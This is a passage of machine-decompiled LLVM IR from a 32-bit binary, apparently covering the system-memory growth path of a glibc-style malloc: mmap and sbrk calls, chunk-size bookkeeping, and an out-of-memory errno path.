  %v8_8060549 = call i32 @mmap(i32 0, i32 %v2_8060530, i32 3, i32 34, i32 0, i32 0, i32 %v1_8060504, i32 %v1_8060504)
  store i32 %v8_8060549, i32* %eax.global-to-local, align 4
  %v10_8060551 = icmp eq i32 %v8_8060549, -1
  store i32 %v8_8060549, i32* %edx.global-to-local, align 4
  br i1 %v10_8060551, label %dec_label_pc_806053c.dec_label_pc_80605e2_crit_edge, label %dec_label_pc_806055c

dec_label_pc_806053c.dec_label_pc_80605e2_crit_edge: ; preds = %dec_label_pc_806053c
  %v0_80605e2.pre = load i32, i32* @global_var_807f42c.682, align 4
  br label %dec_label_pc_80605e2

dec_label_pc_806055c:                             ; preds = %dec_label_pc_806053c
  %v1_806055e = urem i32 %v8_8060549, 8
  %v2_806055e = icmp eq i32 %v1_806055e, 0
  store i32 %v1_806055e, i32* %ecx.global-to-local, align 4
  br i1 %v2_806055e, label %dec_label_pc_8060577, label %dec_label_pc_8060563

dec_label_pc_8060563:                             ; preds = %dec_label_pc_806055c
  %v0_8060568 = load i32, i32* @ebx, align 4
  %v2_806056a = sub nsw i32 8, %v1_806055e
  store i32 %v2_806056a, i32* %eax.global-to-local, align 4
  %v2_806056c = add i32 %v2_806056a, %v8_8060549
  store i32 %v2_806056c, i32* @ecx, align 4
  %v2_806056f = sub i32 %v0_8060568, %v2_806056a
  store i32 %v2_806056f, i32* %esi.global-to-local, align 4
  %v2_8060571 = inttoptr i32 %v2_806056c to i32*
  store i32 %v2_806056a, i32* %v2_8060571, align 4
  br label %dec_label_pc_8060581

dec_label_pc_8060577:                             ; preds = %dec_label_pc_806055c
  store i32 %v8_8060549, i32* @ecx, align 4
  %v1_8060579 = inttoptr i32 %v8_8060549 to i32*
  store i32 0, i32* %v1_8060579, align 4
  br label %dec_label_pc_8060581

dec_label_pc_8060581:                             ; preds = %dec_label_pc_8060563, %dec_label_pc_8060577
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8060563 ], [ @ebx, %dec_label_pc_8060577 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8060581 = or i32 %storemerge, 2
  %v1_8060584 = load i32, i32* @ecx, align 4
  %v2_8060584 = add i32 %v1_8060584, 4
  %v3_8060584 = inttoptr i32 %v2_8060584 to i32*
  store i32 %v1_8060581, i32* %v3_8060584, align 4
  %v0_8060587 = load i32, i32* @global_var_807f750.689, align 16
  %v0_806058c = load i32, i32* @global_var_807f770.691, align 16
  %v1_8060592 = add i32 %v0_8060587, 1
  %v1_8060593 = load i32, i32* @global_var_807f758.692, align 8
  %v2_8060593 = sub i32 %v1_8060592, %v1_8060593
  %v8_8060593 = xor i32 %v1_8060593, %v1_8060592
  %v9_8060593 = xor i32 %v2_8060593, %v1_8060592
  %v10_8060593 = and i32 %v9_8060593, %v8_8060593
  %v11_8060593 = icmp slt i32 %v10_8060593, 0
  %v12_8060593 = icmp eq i32 %v2_8060593, 0
  %v13_8060593 = icmp slt i32 %v2_8060593, 0
  store i32 %v1_8060592, i32* @global_var_807f750.689, align 16
  %v3_806059e = icmp ne i1 %v13_8060593, %v11_8060593
  %v4_806059e = or i1 %v12_8060593, %v3_806059e
  %v7_806059e = select i1 %v4_806059e, i32 %v1_8060593, i32 %v1_8060592
  store i32 %v7_806059e, i32* @global_var_807f758.692, align 8
  %v0_80605aa = load i32, i32* @global_var_807f764.693, align 4
  %v1_80605af = load i32, i32* @ebx, align 4
  %v2_80605af = add i32 %v1_80605af, %v0_80605aa
  store i32 %v2_80605af, i32* @global_var_807f764.693, align 4
  %tmp86 = icmp ule i32 %v2_80605af, %v0_806058c
  %v5_80605bc = select i1 %tmp86, i32 %v0_806058c, i32 %v2_80605af
  store i32 %v5_80605bc, i32* %edx.global-to-local, align 4
  %v1_80605bf = load i32, i32* @global_var_807f768.694, align 8
  %v2_80605bf = add i32 %v1_80605bf, %v2_80605af
  store i32 %v5_80605bc, i32* @global_var_807f770.691, align 16
  %v1_80605cb = load i32, i32* @global_var_807f774.695, align 4
  %tmp140 = icmp ule i32 %v2_80605bf, %v1_80605cb
  %v5_80605d1 = select i1 %tmp140, i32 %v1_80605cb, i32 %v2_80605bf
  store i32 %v5_80605d1, i32* %eax.global-to-local, align 4
  store i32 %v5_80605d1, i32* @global_var_807f774.695, align 4
  br label %dec_label_pc_806048d

dec_label_pc_80605e2:                             ; preds = %dec_label_pc_8060528, %dec_label_pc_806053c.dec_label_pc_80605e2_crit_edge, %dec_label_pc_8060517, %dec_label_pc_8060500
  %v0_80605e2 = phi i32 [ %v0_80605e2.pre, %dec_label_pc_806053c.dec_label_pc_80605e2_crit_edge ], [ %v0_8060495, %dec_label_pc_8060517 ], [ %v0_8060495, %dec_label_pc_8060528 ], [ %v0_8060495, %dec_label_pc_8060500 ]
  store i32 %v0_80605e2, i32* %eax.global-to-local, align 4
  %v1_80605eb = add i32 %v0_80605e2, 4
  %v2_80605eb = inttoptr i32 %v1_80605eb to i32*
  %v3_80605eb = load i32, i32* %v2_80605eb, align 4
  %v1_80605f2 = and i32 %v3_80605eb, -4
  %v2_80605f2 = icmp eq i32 %v1_80605f2, 0
  store i32 %v1_80605f2, i32* @ebp, align 4
  %v1_80605f8 = load i32, i32* @global_var_807f748.696, align 8
  %v0_8060602 = load i8, i8* @global_var_807f760.697, align 32
  %v1_8060602 = urem i8 %v0_8060602, 2
  %v2_8060602 = icmp eq i8 %v1_8060602, 0
  %v1_8060609 = icmp eq i1 %v2_8060602, false
  %v1_80605f2.op = sub i32 0, %v1_80605f2
  %v2_8060600.neg = select i1 %v1_8060609, i32 %v1_80605f2.op, i32 0
  %v2_80605f8 = add i32 %v1_8060504, %v1_80604a2
  %v4_8060609 = add i32 %v2_80605f8, %v1_80605f8
  %v5_8060610 = add i32 %v4_8060609, %v2_8060600.neg
  store i32 %v5_8060610, i32* %eax.global-to-local, align 4
  %v1_8060614 = sub i32 0, %v0_80604d3
  store i32 %v1_8060614, i32* %edx.global-to-local, align 4
  %v2_8060618 = and i32 %v5_8060610, %v1_8060614
  store i32 %v2_8060618, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8060618, 1
  br i1 %tmp87, label %dec_label_pc_8060636, label %dec_label_pc_8060620

dec_label_pc_8060620:                             ; preds = %dec_label_pc_80605e2
  store i32 %v2_8060618, i32* %stack_var_-92, align 4
  %v1_8060624 = call i32 @__GI_sbrk(i32 %v2_8060618)
  store i32 %v1_8060624, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v10_806062f = icmp eq i32 %v1_8060624, -1
  store i32 %v1_8060624, i32* @ebx, align 4
  %v1_8060634 = icmp eq i1 %v10_806062f, false
  br i1 %v1_8060634, label %dec_label_pc_806068d, label %dec_label_pc_8060620.dec_label_pc_8060636_crit_edge

dec_label_pc_8060620.dec_label_pc_8060636_crit_edge: ; preds = %dec_label_pc_8060620
  %v0_8060636.pre = load i8, i8* @global_var_807f760.697, align 32
  br label %dec_label_pc_8060636

dec_label_pc_8060636:                             ; preds = %dec_label_pc_8060620.dec_label_pc_8060636_crit_edge, %dec_label_pc_80605e2
  %v0_8060663 = phi i32 [ -1, %dec_label_pc_8060620.dec_label_pc_8060636_crit_edge ], [ %v1_8060614, %dec_label_pc_80605e2 ]
  %v0_8060636 = phi i8 [ %v0_8060636.pre, %dec_label_pc_8060620.dec_label_pc_8060636_crit_edge ], [ %v0_8060602, %dec_label_pc_80605e2 ]
  %v1_8060636 = urem i8 %v0_8060636, 2
  %v2_8060636 = icmp eq i8 %v1_8060636, 0
  br i1 %v2_8060636, label %dec_label_pc_8060636.dec_label_pc_806064b_crit_edge, label %dec_label_pc_806063f

dec_label_pc_8060636.dec_label_pc_806064b_crit_edge: ; preds = %dec_label_pc_8060636
  %v0_806064b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806064b

dec_label_pc_806063f:                             ; preds = %dec_label_pc_8060636
  %v2_8060643 = add i32 %v1_80605f2, %v1_8060504
  store i32 %v2_8060643, i32* %eax.global-to-local, align 4
  %v0_8060645 = load i32, i32* @esi, align 4
  %v2_8060645 = add i32 %v0_8060645, %v2_8060643
  %v5_8060647 = and i32 %v2_8060645, %v1_8060614
  store i32 %v5_8060647, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806064b

dec_label_pc_806064b:                             ; preds = %dec_label_pc_8060636.dec_label_pc_806064b_crit_edge, %dec_label_pc_806063f
  %v3_8060656 = phi i32 [ %v0_806064b.pre, %dec_label_pc_8060636.dec_label_pc_806064b_crit_edge ], [ %v5_8060647, %dec_label_pc_806063f ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8060656, 1048576
  %v5_8060656 = select i1 %tmp88, i32 1048576, i32 %v3_8060656
  store i32 %v5_8060656, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8060656, %v1_806052a
  br i1 %tmp141, label %dec_label_pc_8060663, label %dec_label_pc_80608a8

dec_label_pc_8060663:                             ; preds = %dec_label_pc_806064b
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8060670 = call i32 @mmap(i32 0, i32 %v5_8060656, i32 3, i32 34, i32 0, i32 0, i32 %v0_8060663, i32 %v0_8060663)
  store i32 %v8_8060670, i32* %eax.global-to-local, align 4
  %v10_8060678 = icmp eq i32 %v8_8060670, -1
  store i32 %v8_8060670, i32* @ebx, align 4
  br i1 %v10_8060678, label %dec_label_pc_80608a8, label %dec_label_pc_8060683

dec_label_pc_8060683:                             ; preds = %dec_label_pc_8060663
  %v0_8060683 = load i8, i8* @global_var_807f760.697, align 1
  %v2_8060683 = and i8 %v0_8060683, -2
  store i8 %v2_8060683, i8* @global_var_807f760.697, align 32
  %v1_806068a = load i32, i32* @esi, align 4
  %v2_806068a = add i32 %v1_806068a, %v8_8060670
  store i32 %v2_806068a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806068d

dec_label_pc_806068d:                             ; preds = %dec_label_pc_8060620, %dec_label_pc_8060683
  %v0_8060754 = phi i32 [ -1, %dec_label_pc_8060620 ], [ %v2_806068a, %dec_label_pc_8060683 ]
  %v0_8060762 = phi i32 [ %v1_8060624, %dec_label_pc_8060620 ], [ %v8_8060670, %dec_label_pc_8060683 ]
  %v10_806068d = icmp eq i32 %v0_8060762, -1
  br i1 %v10_806068d, label %dec_label_pc_80608a8, label %dec_label_pc_8060696

dec_label_pc_8060696:                             ; preds = %dec_label_pc_806068d
  %v0_806069a = load i32, i32* @global_var_807f768.694, align 8
  %v1_806069a = load i32, i32* @esi, align 4
  %v2_806069a = add i32 %v1_806069a, %v0_806069a
  store i32 %v2_806069a, i32* @global_var_807f768.694, align 8
  %v2_80606a0 = add i32 %v1_80605f2, %v0_80605e2
  store i32 %v2_80606a0, i32* %ecx.global-to-local, align 4
  %v2_80606a2 = sub i32 %v0_8060762, %v2_80606a0
  %v7_80606a2 = icmp ult i32 %v0_8060762, %v2_80606a0
  %v12_80606a2 = icmp eq i32 %v2_80606a2, 0
  %v1_80606a4 = icmp eq i1 %v12_80606a2, false
  br i1 %v1_80606a4, label %dec_label_pc_80606bd, label %dec_label_pc_80606a6

dec_label_pc_80606a6:                             ; preds = %dec_label_pc_8060696
  %v10_80606a6 = icmp eq i32 %v0_8060754, -1
  %v1_80606a9 = icmp eq i1 %v10_80606a6, false
  br i1 %v1_80606a9, label %dec_label_pc_80606bd, label %dec_label_pc_80606ab

dec_label_pc_80606ab:                             ; preds = %dec_label_pc_80606a6
  store i32 %v0_80605e2, i32* %ecx.global-to-local, align 4
  %v2_80606af = add i32 %v1_806069a, %v1_80605f2
  %v1_80606b2 = or i32 %v2_80606af, 1
  store i32 %v1_80606b2, i32* %eax.global-to-local, align 4
  store i32 %v1_80606b2, i32* %v2_80605eb, align 4
  br label %dec_label_pc_80607ea

dec_label_pc_80606bd:                             ; preds = %dec_label_pc_80606a6, %dec_label_pc_8060696
  %v0_80606bd = load i8, i8* @global_var_807f760.697, align 1
  %v1_80606bd = sext i8 %v0_80606bd to i32
  store i32 %v1_80606bd, i32* %eax.global-to-local, align 4
  %v2_80606c2 = urem i8 %v0_80606bd, 2
  %v3_80606c2 = icmp eq i8 %v2_80606c2, 0
  br i1 %v3_80606c2, label %dec_label_pc_80606d6, label %dec_label_pc_80606c6

dec_label_pc_80606c6:                             ; preds = %dec_label_pc_80606bd
  br i1 %v2_80605f2, label %dec_label_pc_80606d6, label %dec_label_pc_80606ca

dec_label_pc_80606ca:                             ; preds = %dec_label_pc_80606c6
  %v1_80606cc = icmp eq i1 %v7_80606a2, false
  br i1 %v1_80606cc, label %dec_label_pc_80606d6, label %dec_label_pc_80606ce

dec_label_pc_80606ce:                             ; preds = %dec_label_pc_80606ca
  %v1_80606ce = and i32 %v1_80606bd, -2
  %v4_80606ce = trunc i32 %v1_80606ce to i8
  store i32 %v1_80606ce, i32* %eax.global-to-local, align 4
  store i8 %v4_80606ce, i8* @global_var_807f760.697, align 32
  br label %dec_label_pc_80606d6

dec_label_pc_80606d6:                             ; preds = %dec_label_pc_80606ca, %dec_label_pc_80606c6, %dec_label_pc_80606bd, %dec_label_pc_80606ce
  %v0_80606d6 = phi i8 [ %v0_80606bd, %dec_label_pc_80606ca ], [ %v0_80606bd, %dec_label_pc_80606c6 ], [ %v0_80606bd, %dec_label_pc_80606bd ], [ %v4_80606ce, %dec_label_pc_80606ce ]
  %v1_80606d6 = urem i8 %v0_80606d6, 2
  %v2_80606d6 = icmp eq i8 %v1_80606d6, 0
  br i1 %v2_80606d6, label %dec_label_pc_8060754, label %dec_label_pc_80606df

dec_label_pc_80606df:                             ; preds = %dec_label_pc_80606d6
  br i1 %v2_80605f2, label %dec_label_pc_80606ed, label %dec_label_pc_80606e3

dec_label_pc_80606e3:                             ; preds = %dec_label_pc_80606df
  store i32 %v2_80606a2, i32* %eax.global-to-local, align 4
  %v2_80606e7 = add i32 %v2_806069a, %v2_80606a2
  store i32 %v2_80606e7, i32* @global_var_807f768.694, align 8
  br label %dec_label_pc_80606ed

dec_label_pc_80606ed:                             ; preds = %dec_label_pc_80606df, %dec_label_pc_80606e3
  %v1_80606ef = urem i32 %v0_8060762, 8
  %v2_80606ef = icmp eq i32 %v1_80606ef, 0
  store i32 %v1_80606ef, i32* %edx.global-to-local, align 4
  %v1_80606f2 = icmp eq i1 %v2_80606ef, false
  br i1 %v1_80606f2, label %dec_label_pc_80606fa, label %dec_label_pc_80606f4

dec_label_pc_80606f4:                             ; preds = %dec_label_pc_80606ed
  store i32 %v0_8060762, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060704

dec_label_pc_80606fa:                             ; preds = %dec_label_pc_80606ed
  %v2_80606ff = sub nsw i32 8, %v1_80606ef
  store i32 %v2_80606ff, i32* %eax.global-to-local, align 4
  %v2_8060701 = add i32 %v2_80606ff, %v0_8060762
  store i32 %v2_8060701, i32* @edi, align 4
  br label %dec_label_pc_8060704

dec_label_pc_8060704:                             ; preds = %dec_label_pc_80606f4, %dec_label_pc_80606fa
  %v0_8060711 = phi i32 [ 0, %dec_label_pc_80606f4 ], [ %v2_80606ff, %dec_label_pc_80606fa ]
  %v2_8060704 = add i32 %v1_806069a, %v0_8060762
  %v2_8060711 = add i32 %v0_8060711, %v1_80605f2
  store i32 %v2_8060711, i32* %ecx.global-to-local, align 4
  %v2_8060714 = add i32 %v2_8060711, %v2_8060704
  store i32 %v2_8060714, i32* %edx.global-to-local, align 4
  %v2_8060716 = add i32 %v2_8060714, %v1_8060504
  %v5_8060719 = and i32 %v2_8060716, %v1_8060614
  %v2_8060720 = sub i32 %v5_8060719, %v2_8060714
  store i32 %v2_8060720, i32* %eax.global-to-local, align 4
  %v2_8060722 = add i32 %v2_8060720, %v2_8060711
  store i32 %v2_8060722, i32* @esi, align 4
  store i32 %v2_8060722, i32* %stack_var_-92, align 4
  %v1_8060726 = call i32 @__GI_sbrk(i32 %v2_8060722)
  store i32 %v1_8060726, i32* %eax.global-to-local, align 4
  %v10_806072e = icmp eq i32 %v1_8060726, -1
  store i32 %v1_8060726, i32* %edx.global-to-local, align 4
  %v1_8060733 = icmp eq i1 %v10_806072e, false
  br i1 %v1_8060733, label %dec_label_pc_8060743, label %dec_label_pc_8060735

dec_label_pc_8060735:                             ; preds = %dec_label_pc_8060704
  store i32 0, i32* %stack_var_-92, align 4
  %v1_806073a = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_806073a, i32* %eax.global-to-local, align 4
  store i32 %v1_806073a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060777

dec_label_pc_8060743:                             ; preds = %dec_label_pc_8060704
  %v1_8060743 = load i32, i32* @ebx, align 4
  %v7_8060743 = icmp ult i32 %v1_8060726, %v1_8060743
  %v1_8060745 = icmp eq i1 %v7_8060743, false
  br i1 %v1_8060745, label %dec_label_pc_806077c, label %dec_label_pc_8060747

dec_label_pc_8060747:                             ; preds = %dec_label_pc_8060743
  %v0_8060747 = load i8, i8* @global_var_807f760.697, align 1
  %v2_8060747 = and i8 %v0_8060747, -2
  store i8 %v2_8060747, i8* @global_var_807f760.697, align 32
  store i32 %v2_8060704, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806075b

dec_label_pc_8060754:                             ; preds = %dec_label_pc_80606d6
  %v10_8060754 = icmp eq i32 %v0_8060754, -1
  br i1 %v10_8060754, label %dec_label_pc_806075f, label %dec_label_pc_8060759

dec_label_pc_8060759:                             ; preds = %dec_label_pc_8060754
  store i32 %v0_8060762, i32* @edi, align 4
  br label %dec_label_pc_806075b

dec_label_pc_806075b:                             ; preds = %dec_label_pc_8060747, %dec_label_pc_8060759
  %v0_806077c47 = phi i32 [ %v2_8060704, %dec_label_pc_8060747 ], [ %v0_8060754, %dec_label_pc_8060759 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_806077c

dec_label_pc_806075f:                             ; preds = %dec_label_pc_8060754
  store i32 %v0_8060762, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8060766 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8060766, i32* %edx.global-to-local, align 4
  %v1_806076d = load i32, i32* @ebx, align 4
  %v2_806076d = sub i32 %v1_8060766, %v1_806076d
  %v1_806076f = load i32, i32* @esi, align 4
  %v2_806076f = sub i32 %v2_806076d, %v1_806076f
  store i32 %v2_806076f, i32* %eax.global-to-local, align 4
  %v0_8060771 = load i32, i32* @global_var_807f768.694, align 8
  %v2_8060771 = add i32 %v0_8060771, %v2_806076f
  store i32 %v2_8060771, i32* @global_var_807f768.694, align 8
  br label %dec_label_pc_8060777

dec_label_pc_8060777:                             ; preds = %dec_label_pc_8060735, %dec_label_pc_806075f
  %v0_806077c46 = phi i32 [ %v1_806073a, %dec_label_pc_8060735 ], [ %v1_8060766, %dec_label_pc_806075f ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_806077c

dec_label_pc_806077c:                             ; preds = %dec_label_pc_8060743, %dec_label_pc_806075b, %dec_label_pc_8060777
  %v0_8060781 = phi i32 [ %v1_8060726, %dec_label_pc_8060743 ], [ %v0_806077c47, %dec_label_pc_806075b ], [ %v0_806077c46, %dec_label_pc_8060777 ]
  %v10_806077c = icmp eq i32 %v0_8060781, -1
  br i1 %v10_806077c, label %dec_label_pc_80607ea, label %dec_label_pc_8060781

dec_label_pc_8060781:                             ; preds = %dec_label_pc_806077c
  %v1_8060781 = load i32, i32* @edi, align 4
  %v2_8060781 = sub i32 %v0_8060781, %v1_8060781
  store i32 %v2_8060781, i32* %edx.global-to-local, align 4
  %v1_8060783 = load i32, i32* @esi, align 4
  %v2_8060783 = add i32 %v1_8060783, %v2_8060781
  %v1_8060786 = or i32 %v2_8060783, 1
  store i32 %v1_8060786, i32* %eax.global-to-local, align 4
  store i32 %v1_8060781, i32* @global_var_807f42c.682, align 4
  %v2_806078f = add i32 %v1_8060781, 4
  %v3_806078f = inttoptr i32 %v2_806078f to i32*
  store i32 %v1_8060786, i32* %v3_806078f, align 4
  %v0_8060792 = load i32, i32* @global_var_807f768.694, align 8
  %v1_8060792 = load i32, i32* @esi, align 4
  %v2_8060792 = add i32 %v1_8060792, %v0_8060792
  store i32 %v2_8060792, i32* @global_var_807f768.694, align 8
  br i1 %v2_80605f2, label %dec_label_pc_80607ea, label %dec_label_pc_806079c

dec_label_pc_806079c:                             ; preds = %dec_label_pc_8060781
  store i32 %v0_80605e2, i32* @ecx, align 4
  %v1_80607a0 = add i32 %v1_80605f2, -12
  %v1_80607a3 = and i32 %v1_80607a0, -8
  store i32 %v1_80607a3, i32* %eax.global-to-local, align 4
  %v1_80607a8 = or i32 %v1_80607a3, 1
  store i32 %v1_80607a8, i32* %edx.global-to-local, align 4
  %v5_80607ab = icmp ult i32 %v1_80607a3, 15
  store i32 %v1_80607a8, i32* %v2_80605eb, align 4
  %v0_80607b1 = load i32, i32* @ecx, align 4
  %v1_80607b1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80607b1 = add i32 %v0_80607b1, 4
  %v3_80607b1 = add i32 %v2_80607b1, %v1_80607b1
  %v4_80607b1 = inttoptr i32 %v3_80607b1 to i32*
  store i32 5, i32* %v4_80607b1, align 4
  %v0_80607b9 = load i32, i32* @ecx, align 4
  %v1_80607b9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80607b9 = add i32 %v0_80607b9, 8
  %v3_80607b9 = add i32 %v2_80607b9, %v1_80607b9
  %v4_80607b9 = inttoptr i32 %v3_80607b9 to i32*
  store i32 5, i32* %v4_80607b9, align 4
  br i1 %v5_80607ab, label %dec_label_pc_80607ea, label %dec_label_pc_80607c3

dec_label_pc_80607c3:                             ; preds = %dec_label_pc_806079c
  %v0_80607c3 = load i32, i32* @global_var_807f744.698, align 4
  store i32 %v0_80607c3, i32* @ebx, align 4
  %v0_80607c9 = load i32, i32* @ecx, align 4
  %v1_80607ce = add i32 %v0_80607c9, 8
  store i32 %v1_80607ce, i32* %eax.global-to-local, align 4
  store i32 %v1_80607ce, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_807f744.698, align 4
  %v1_80607dc = call i32 @free(i32 %v1_80607ce)
  store i32 %v1_80607dc, i32* %eax.global-to-local, align 4
  %v0_80607e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80607e4, i32* @global_var_807f744.698, align 4
  br label %dec_label_pc_80607ea

dec_label_pc_80607ea:                             ; preds = %dec_label_pc_806079c, %dec_label_pc_8060781, %dec_label_pc_806077c, %dec_label_pc_80606ab, %dec_label_pc_80607c3
  %v0_80607ea = load i32, i32* @global_var_807f768.694, align 8
  %v0_80607ef = load i32, i32* @global_var_807f76c.699, align 4
  %v0_80607fb = load i32, i32* @global_var_807f42c.682, align 4
  store i32 %v0_80607fb, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_80607ea, %v0_80607ef
  %v5_8060801 = select i1 %tmp89, i32 %v0_80607ef, i32 %v0_80607ea
  store i32 %v5_8060801, i32* %edx.global-to-local, align 4
  %v1_8060804 = load i32, i32* @global_var_807f764.693, align 4
  %v2_8060804 = add i32 %v1_8060804, %v0_80607ea
  store i32 %v5_8060801, i32* @global_var_807f76c.699, align 4
  %v1_8060810 = load i32, i32* @global_var_807f774.695, align 4
  %tmp90 = icmp ule i32 %v2_8060804, %v1_8060810
  %v5_8060816 = select i1 %tmp90, i32 %v1_8060810, i32 %v2_8060804
  store i32 %v5_8060816, i32* %eax.global-to-local, align 4
  store i32 %v5_8060816, i32* @global_var_807f774.695, align 4
  %v1_8060822 = add i32 %v0_80607fb, 4
  %v2_8060822 = inttoptr i32 %v1_8060822 to i32*
  %v3_8060822 = load i32, i32* %v2_8060822, align 4
  %v1_8060825 = and i32 %v3_8060822, -4
  store i32 %v1_8060825, i32* @ecx, align 4
  %v10_8060828 = icmp ult i32 %v1_8060825, %v1_80604a2
  br i1 %v10_8060828, label %dec_label_pc_80608a8, label %dec_label_pc_806082e

dec_label_pc_806082e:                             ; preds = %dec_label_pc_80607ea
  store i32 %v1_806052a, i32* %esi.global-to-local, align 4
  %v2_8060834 = sub i32 %v1_8060825, %v1_806052a
  store i32 %v2_8060834, i32* %ecx.global-to-local, align 4
  %v2_8060836 = add i32 %v0_80607fb, %v1_806052a
  store i32 %v2_8060836, i32* %edx.global-to-local, align 4
  %v1_8060839 = or i32 %v1_806052a, 1
  store i32 %v1_8060839, i32* %eax.global-to-local, align 4
  store i32 %v2_8060836, i32* @global_var_807f42c.682, align 4
  store i32 %v1_8060839, i32* %v2_8060822, align 4
  %v0_8060845.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060845

dec_label_pc_8060845:                             ; preds = %dec_label_pc_80604b0, %dec_label_pc_806082e
  %v0_8060845 = phi i32 [ %v5_80604c3, %dec_label_pc_80604b0 ], [ %v0_8060845.pre, %dec_label_pc_806082e ]
  %v1_8060845 = or i32 %v0_8060845, 1
  store i32 %v1_8060845, i32* @ecx, align 4
  %v0_8060848 = load i32, i32* @ebx, align 4
  %v1_8060848 = add i32 %v0_8060848, 8
  store i32 %v1_8060848, i32* @ebx, align 4
  %v1_806084b = load i32, i32* %edx.global-to-local, align 4
  %v2_806084b = add i32 %v1_806084b, 4
  %v3_806084b = inttoptr i32 %v2_806084b to i32*
  store i32 %v1_8060845, i32* %v3_806084b, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_8060850:                             ; preds = %dec_label_pc_8060262
  %v5_8060856 = sub i32 %v1_8060245, %v1_806052a
  store i32 %v5_8060856, i32* %eax.global-to-local, align 4
  %v2_806085a = add i32 %v0_8060310118, %v1_806052a
  store i32 %v2_806085a, i32* %edx.global-to-local, align 4
  %v1_806085e = or i32 %v1_806052a, 1
  store i32 %v2_806085a, i32* @global_var_807f430.683, align 16
  store i32 %v1_806085e, i32* %v2_806023f, align 4
  %v0_806086a = load i32, i32* %eax.global-to-local, align 4
  %v1_806086c = or i32 %v0_806086a, 1
  store i32 %v1_806086c, i32* @ecx, align 4
  %v0_806086f = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_806086f, i32* @global_var_807f43c.700, align 4
  store i32 %v0_806086f, i32* @global_var_807f440.685, align 64
  %v1_806087b = add i32 %v0_806086f, 8
  %v2_806087b = inttoptr i32 %v1_806087b to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_806087b, align 4
  %v0_8060882 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060882 = add i32 %v0_8060882, 12
  %v2_8060882 = inttoptr i32 %v1_8060882 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060882, align 4
  %v0_8060889 = load i32, i32* @ecx, align 4
  %v1_8060889 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060889 = add i32 %v1_8060889, 4
  %v3_8060889 = inttoptr i32 %v2_8060889 to i32*
  store i32 %v0_8060889, i32* %v3_8060889, align 4
  %v0_806088c = load i32, i32* %eax.global-to-local, align 4
  %v1_806088c = load i32, i32* %edx.global-to-local, align 4
  %v3_806088c = add i32 %v1_806088c, %v0_806088c
  %v4_806088c = inttoptr i32 %v3_806088c to i32*
  store i32 %v0_806088c, i32* %v4_806088c, align 4
  br label %dec_label_pc_806089a

dec_label_pc_8060891:                             ; preds = %dec_label_pc_8060271
  store i32 %v1_806052a, i32* %ebx.global-to-local, align 4
  %v0_8060895 = load i32, i32* @ebp, align 4
  %v2_8060895 = or i32 %v1_806052a, 4
  %v3_8060895 = add i32 %v0_8060895, %v2_8060895
  %v4_8060895 = inttoptr i32 %v3_8060895 to i32*
  %v5_8060895 = load i32, i32* %v4_8060895, align 4
  %v6_8060895 = or i32 %v5_8060895, 1
  store i32 %v6_8060895, i32* %v4_8060895, align 4
  br label %dec_label_pc_806089a

dec_label_pc_806089a:                             ; preds = %dec_label_pc_8060850, %dec_label_pc_8060891
  %v0_806089a = load i32, i32* @ebp, align 4
  %v1_806089a = add i32 %v0_806089a, 8
  store i32 %v1_806089a, i32* @ebx, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_806089f:                             ; preds = %dec_label_pc_8060361
  %v1_806089f = load i32, i32* @ebx, align 4
  %v2_806089f = add i32 %v0_806036d, 4
  %v3_806089f = add i32 %v2_806089f, %v1_806089f
  %v4_806089f = inttoptr i32 %v3_806089f to i32*
  %v5_806089f = load i32, i32* %v4_806089f, align 4
  %v6_806089f = or i32 %v5_806089f, 1
  store i32 %v6_806089f, i32* %v4_806089f, align 4
  br label %dec_label_pc_80608a4

dec_label_pc_80608a4:                             ; preds = %dec_label_pc_8060379, %dec_label_pc_806089f
  %v0_80608a4 = load i32, i32* @ecx, align 4
  store i32 %v0_80608a4, i32* @ebx, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_80608a8:                             ; preds = %dec_label_pc_806064b, %dec_label_pc_80607ea, %dec_label_pc_806068d, %dec_label_pc_8060663
  %v0_80608a8 = load i32, i32* %stack_var_-92, align 4
  %v1_80608a8 = call i32 @__errno_location(i32 %v0_80608a8)
  store i32 %v1_80608a8, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80608af = inttoptr i32 %v1_80608a8 to i32*
  store i32 12, i32* %v1_80608af, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_80608b5:                             ; preds = %dec_label_pc_80608a4, %dec_label_pc_806089a, %dec_label_pc_8060845, %dec_label_pc_80604db, %dec_label_pc_806048d, %dec_label_pc_806020c, %dec_label_pc_80608a8
  store i32 %v2_8060143, i32* %eax.global-to-local, align 4
  store i32 %v2_8060143, i32* %stack_var_-92, align 4
  %v3_80608be = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
